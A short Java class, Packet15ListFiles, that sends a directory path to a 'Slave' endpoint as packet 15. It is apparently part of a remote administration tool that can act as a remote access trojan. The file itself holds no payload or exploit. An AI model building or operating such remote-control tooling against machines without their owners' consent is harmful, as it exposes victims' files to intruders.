package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.Slave;

public class Packet15ListFiles extends AbstractOutgoingPacket {

	private String path;
	
	public Packet15ListFiles(String path) {
		this.path = path;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(path);
	}

	@Override
	public byte getPacketId() {
		return 15;
	}

}
